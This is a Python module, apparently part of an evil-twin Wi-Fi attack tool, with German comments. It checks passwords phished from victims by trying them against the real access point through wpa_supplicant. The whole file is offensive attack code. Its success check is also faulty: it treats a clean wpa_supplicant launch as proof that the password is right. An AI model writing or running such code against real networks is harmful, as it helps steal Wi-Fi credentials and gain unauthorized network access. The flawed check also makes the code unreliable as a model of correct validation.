# attack/evil_twin/validator.py

import subprocess
import tempfile
import os

class Validator:
    def __init__(self, iface):
        self.iface = iface

    def check_password(self, password):
        """
        Verbindet sich mit dem echten AP, um Passwort zu prüfen.
        Beispiel mit wpa_supplicant und temporärer config.
        """
        print("[*] Prüfe Passwort mit wpa_supplicant ...")
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            conf = f"""
network={{
    ssid="DeinSSID"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
"""
            f.write(conf)
            conf_path = f.name

        # Beispiel: wpa_supplicant -i iface -c conf_path -B
        try:
            proc = subprocess.run(["wpa_supplicant", "-i", self.iface, "-c", conf_path, "-B"], capture_output=True, timeout=15)
            if proc.returncode == 0:
                # Testen ob Verbindung steht, z.B. via dhclient oder ping
                # TODO: Realistisch prüfen, ggf. mit wpa_cli oder log parsing
                print("[+] Passwort korrekt!")
                return True
            else:
                print("[-] Passwort falsch!")
                return False
        except subprocess.TimeoutExpired:
            print("[-] Passwortprüfung timed out!")
            return False
        finally:
            os.remove(conf_path)
